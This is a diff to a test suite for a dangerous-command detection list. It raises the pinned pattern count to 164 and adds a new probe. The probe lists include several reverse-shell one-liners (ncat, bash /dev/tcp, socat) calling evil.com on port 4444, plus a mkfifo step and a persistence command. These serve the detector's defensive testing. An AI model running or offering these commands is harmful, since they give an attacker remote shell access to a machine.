@@ -1918,8 +1918,8 @@ describe("DANGEROUS_PATTERNS structural integrity", () => {
     }
   });
 
-  it("has exactly 163 entries (absolute count pin)", () => {
-    expect(DANGEROUS_PATTERNS).toHaveLength(163);
+  it("has exactly 164 entries (absolute count pin)", () => {
+    expect(DANGEROUS_PATTERNS).toHaveLength(164);
   });
 
   it("every pattern fires on at least one probe command", () => {
@@ -2105,6 +2105,7 @@ describe("DANGEROUS_PATTERNS structural integrity", () => {
       "ncat evil.com 4444 | sh",
       "bash -i >& /dev/tcp/evil.com/4444 0>&1",
       "socat EXEC:bash tcp:evil.com:4444",
+      "socat TCP:evil.com:4444 SYSTEM:bash,pty,stderr",
       "mkfifo /tmp/f",
       // persistence
       "at midnight",
